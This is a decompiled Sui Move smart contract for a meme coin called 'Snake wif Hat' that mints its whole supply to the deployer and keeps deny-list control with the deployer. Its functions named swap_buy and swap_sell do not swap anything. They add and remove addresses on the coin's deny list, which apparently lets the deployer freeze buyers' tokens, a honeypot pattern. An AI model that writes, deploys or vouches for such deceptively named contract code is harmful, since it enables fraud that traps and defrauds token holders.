module 0x70fbee169a058cad79f850f38f701642c3cfdeff40a04d6b45e14ad152241f01::sssss {
    struct SSSSS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SSSSS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SSSSS>(arg0, 9, b"SSSSS", b"Snake wif Hat", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZKSbmbRMR1d7kBAYnHS3pbdvBC3MTwnCdsXYpV6Lo8t8"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SSSSS>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SSSSS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SSSSS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SSSSS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SSSSS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SSSSS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SSSSS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SSSSS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

